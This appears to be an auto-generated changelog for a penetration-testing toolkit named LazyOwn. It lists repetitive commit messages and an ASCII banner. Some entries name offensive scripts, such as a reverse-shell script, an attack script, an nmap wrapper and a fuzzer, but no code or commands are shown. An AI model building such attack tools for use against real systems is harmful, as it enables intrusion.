

### Otros

### Otros

  *   * Update app.py


### Otros

### Otros

  *   * Create lazyown_metaextract0r.py


### Otros

### Otros

  *   * Update README.md


### Otros

### Otros

  *   * Update lazygptcli.py


### Otros

### Otros

  *   * Update README.md


### Otros

### Otros

  *   * Update lazygptcli.py


### Otros

### Otros

  *   * Update lazygptcli.py


### Otros

### Otros

  *   * Update README.md


### Otros

### Otros

  *   * Update app.py


### Otros

### Otros

  *   * Update README.md


### Otros

### Otros

  *   * Update README.md


### Otros

### Otros

  *   * Update README.md


### Otros

### Otros

  *   * Create app.py


### Otros

### Otros

  *   * Update README.md


### Otros

### Otros

  *   * Update README.md


### Otros

### Otros

  *   * Create lazyown_bprfuzzer.py


### Otros

### Otros

  *   * Update lazygptcli.py


### Otros

### Otros

  *   * Merge pull request #6 from grisuno/grisuno-patch-5


### Otros

### Otros

  *   * Update update_db.sh


### Otros

### Otros

  *   * Update update_db.sh


### Otros

### Otros

  *   * Update requirements.txt


### Otros

### Otros

  *   * Update README.md


### Otros

### Otros

  *   * Update README.md


### Otros

### Otros

  *   * Update lazygptcli.py


### Otros

### Otros

  *   * Create lazygptcli.py


### Otros

### Otros

  *   * Update README.md


### Otros

### Otros

  *   * Update README.md


### Otros

### Otros

  *   * Update README.md


### Otros

### Otros

  *   * Create lazynmap.sh


### Otros

### Otros

  *   * Update lazyreverse_shell.sh


### Otros

### Otros

  *   * Merge pull request #5 from grisuno/grisuno-patch-4


### Otros

### Otros

  *   * Update README.md


### Otros

### Otros

  *   * Update README.md


### Otros

### Otros

  *   * Create lazyreverse_shell.sh


### Otros

### Otros

  *   * Update README.md


### Otros

### Otros

  *   * Update requirements.txt


### Otros

### Otros

  *   * Update README.md


### Otros

### Otros

  *   * Update LazyOwnExplorer.py


### Otros

### Otros

  *   * Update README.md


### Otros

### Otros

  *   * Create LazyOwnExplorer.py


### Otros

### Otros

  *   * Update README.md


### Otros

### Otros

  *   * Merge pull request #4 from grisuno/grisuno-patch-3


### Otros

### Otros

  *   * Create requirements.txt


### Otros

### Otros

  *   * Create CODE_OF_CONDUCT.md


### Otros

### Otros

  *   * Update issue templates


### Otros

### Otros

  *   * Create SECURITY.md


### Otros

### Otros

  *   * Create CONTRIBUTING.md


### Otros

### Otros

  *   * Merge pull request #3 from grisuno/grisuno-patch-2


### Otros

### Otros

  *   * Create LICENSE


### Otros

### Otros

  *   * Merge pull request #1 from grisuno/grisuno-patch-1


### Otros

### Otros

  *   * Update lazyown.py


### Otros

### Otros

  *   * Update README.md


### Otros

### Otros

  *   * Update README.md


### Otros

### Otros

  *   * Create lazyatack.sh


### Otros

### Otros

  *   * Update README.md


### Otros

### Otros

  *   * Update README.md


### Otros

### Otros

  *   * Create lazysearch.py


### Otros

### Otros

  *   * Update README.md


### Otros

### Otros

  *   * Update README.md


### Otros

### Otros

  *   * Update update_db.sh


### Otros

### Otros

  *   * Update update_db.sh


### Otros

### Otros

  *   * Update README.md


### Otros

### Otros

  *   * ██╗      █████╗ ███████╗██╗   ██╗ ██████╗ ██╗    ██╗███╗   ██╗ ██║     ██╔══██╗╚══███╔╝╚██╗ ██╔╝██╔═══██╗██║    ██║████╗  ██║ ██║     ███████║  ███╔╝  ╚████╔╝ ██║   ██║██║ █╗ ██║██╔██╗ ██║ ██║     ██╔══██║ ███╔╝    ╚██╔╝  ██║   ██║██║███╗██║██║╚██╗██║ ███████╗██║  ██║███████╗   ██║   ╚██████╔╝╚███╔███╔╝██║ ╚████║ ╚══════╝╚═╝  ╚═╝╚══════╝   ╚═╝    ╚═════╝  ╚══╝╚══╝ ╚═╝  ╚═══╝


### Otros

### Otros

  *   * Create update_db.sh


### Otros

### Otros

  *   * Update README.md


### Otros

### Otros

  *   * Add files via upload


### Otros

### Otros

  *   * Create lazyown.py


### Otros

### Otros

  *   * Create bin_data_relevant.csv


### Otros

### Otros

  *   * Create bin_data.csv


### Otros

### Otros

  *   * Create detailed_search.py


### Otros

### Otros

  *   * Create search.py


### Otros

### Otros

  *   * Update README.md

* Initial commit* Initial commit  * docs(update readme description): change of the description; Update README.md  * docs(update readme description): change of the description; Update README.md<!-- END CHANGELOG -->
